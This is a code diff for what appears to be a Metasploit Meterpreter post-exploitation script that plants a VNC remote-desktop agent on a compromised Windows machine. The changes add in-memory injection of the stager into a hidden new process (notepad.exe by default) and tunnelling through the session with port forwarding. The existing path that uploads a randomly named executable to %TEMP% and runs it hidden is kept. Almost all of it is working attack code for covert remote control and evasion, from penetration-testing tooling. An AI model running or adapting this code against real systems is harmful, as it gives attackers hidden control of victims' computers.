@@ -11,10 +11,13 @@ session = client
 #
 opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false,  "This help menu"],
-	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
+	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4545)"],
+	"-i"  => [ false,  "Inject the vnc server into a new process's memory instead of building an exe"],
+	"-P"  => [ true,   "Executable to inject into (starts a new process).  Only useful with -i (default: notepad.exe)"],
 	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
-	"-C"  => [ false,  "Disable the VNC courtesy shell"]
+	"-t"  => [ false,  "Tunnel through the current session connection. (Will be slower)"],
+	"-c"  => [ false,  "Enable the VNC courtesy shell"]
 )
 
 #
@@ -23,8 +26,13 @@ opts = Rex::Parser::Arguments.new(
 
 rhost    = Rex::Socket.source_address("1.2.3.4")
 rport    = 4545
+lhost    = "127.0.0.1"
+
 autoconn = true
-courtesy = true
+courtesy = false
+tunnel   = false
+inject   = false
+runme    = "notepad.exe"
 
 #
 # Option parsing
@@ -38,62 +46,101 @@ opts.parse(args) do |opt, idx, val|
 		rhost = val
 	when "-p"
 		rport = val.to_i
+	when "-P"
+		runme = val
 	when "-D"
 		autoconn = false
-	when "-C"
+	when "-c"
 		courtesy = true
+	when "-t"
+		tunnel = true
+		autoconn = true
+	when "-i"
+		inject = true
 	end
 end
 
-#
-# Create the agent EXE
-#
-print_status("Creating a VNC stager: LHOST=#{rhost} LPORT=#{rport})")
-pay = client.framework.payloads.create("windows/vncinject/reverse_tcp")
-pay.datastore['LHOST'] = rhost
-pay.datastore['LPORT'] = rport
-raw  = pay.generate
-
-exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
-print_status("VNC stager executable #{exe.length} bytes long")
-
 
 #
-# Upload to the filesystem
+# Create the raw payload
 #
+if (tunnel)
+	print_status("Creating a VNC bind tcp stager: RHOST=#{lhost} LPORT=#{rport}")
+	payload = "windows/vncinject/bind_tcp"
 
-tempdir = client.fs.file.expand_path("%TEMP%")
-tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
-tempexe.gsub!("\\\\", "\\")
+	pay = client.framework.payloads.create(payload)
+	pay.datastore['RHOST'] = lhost
+	pay.datastore['LPORT'] = rport
+else
+	print_status("Creating a VNC reverse tcp stager: LHOST=#{rhost} LPORT=#{rport})")
+	payload = "windows/vncinject/reverse_tcp"
 
-fd = client.fs.file.new(tempexe, "wb")
-fd.write(exe)
-fd.close
+	pay = client.framework.payloads.create(payload)
+	pay.datastore['LHOST'] = rhost
+	pay.datastore['LPORT'] = rport
+end
 
-print_status("Uploaded the VNC agent to #{tempexe} (must be deleted manually)")
-
-#
-# Setup the multi/handler if requested
-#
-
-if(autoconn)
+if autoconn
 	mul = client.framework.exploits.create("multi/handler")
-	mul.datastore['PAYLOAD']   = "windows/vncinject/reverse_tcp"
-	mul.datastore['LHOST']     = rhost
-	mul.datastore['LPORT']     = rport
-	mul.datastore['EXITFUNC']  = 'process'
+	mul.share_datastore(pay.datastore)
+	p mul.datastore
+
+	mul.datastore['PAYLOAD'] = payload
+	mul.datastore['EXITFUNC'] = 'process'
 	mul.datastore['ExitOnSession'] = true
-	if (courtesy)
+	mul.datastore['WfsDelay'] = 7
+	if (not courtesy)
 		mul.datastore['DisableCourtesyShell'] = true
 	end
+	print_status("Running payload handler")
 	mul.exploit_simple(
-		'Payload'        => mul.datastore['PAYLOAD'],
-		'RunAsJob'       => true
+		'Payload'  => mul.datastore['PAYLOAD'],
+		'RunAsJob' => true
 	)
 end
 
-#
-# Execute the agent
-#
-print_status("Executing the VNC agent with endpoint #{rhost}:#{rport}...")
-proc = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
+p pay.datastore
+raw = pay.generate
+if (inject)
+	#
+	# Create a host process
+	#
+	pid = client.sys.process.execute("#{runme}", nil, {'Hidden' => 'true'}).pid
+	print_status("Host process #{runme} has PID #{pid}")
+	host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+	mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
+
+	print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
+	print_status("Writing the VNC stager into memory...")
+	host_process.memory.write(mem, raw)
+	host_process.thread.create(mem, 0)
+else
+	exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
+	print_status("VNC stager executable #{exe.length} bytes long")
+
+	#
+	# Upload to the filesystem
+	#
+	tempdir = client.fs.file.expand_path("%TEMP%")
+	tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+	tempexe.gsub!("\\\\", "\\")
+
+	fd = client.fs.file.new(tempexe, "wb")
+	fd.write(exe)
+	fd.close
+	print_status("Uploaded the VNC agent to #{tempexe} (must be deleted manually)")
+
+	#
+	# Execute the agent
+	#
+	print_status("Executing the VNC agent with endpoint #{rhost}:#{rport}...")
+	pid = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
+end
+
+if tunnel
+	# Set up a port forward for the multi/handler to use for uploading the stage
+	print_status("Starting the port forwarding from #{rport} => TARGET:#{rport}")
+	client.run_cmd("portfwd add -L 127.0.0.1 -l #{rport} -p #{rport} -r #{lhost}")
+end
+
+
